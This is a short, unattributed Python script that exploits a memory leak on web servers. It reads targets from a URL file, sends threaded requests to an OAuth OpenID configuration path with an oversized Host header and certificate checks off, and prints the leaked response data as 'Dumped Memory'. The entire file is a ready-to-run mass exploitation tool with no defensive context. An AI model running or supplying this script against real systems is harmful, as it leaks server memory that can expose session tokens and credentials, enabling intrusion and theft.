# Not mine, unknown source

import requests
import urllib3
import threading
import os
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Read URLs from file
with open('urls.txt', 'r') as file:
    urls = file.readlines()

def check_url(url):
    start_time = time.time()
    headers = {
        "Host": "a"*24576
    }
    r = requests.get(f"{url.strip()}/oauth/idp/.well-known/openid-configuration", headers=headers, verify=False,timeout=10)
    end_time = time.time()
    size = len(r.content)
    if r.status_code == 200:
        print(f"--- Dumped Memory for {url.strip()} ---")
        print(r.text[131050:])
        print("---      End      ---")
        print(f"Response size: {size} bytes")
        print(f"Time taken: {end_time - start_time} seconds")
    else:
        print(f"Could not dump memory for {url.strip()}")

threads = []
for url in urls:
    thread = threading.Thread(target=check_url, args=(url,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
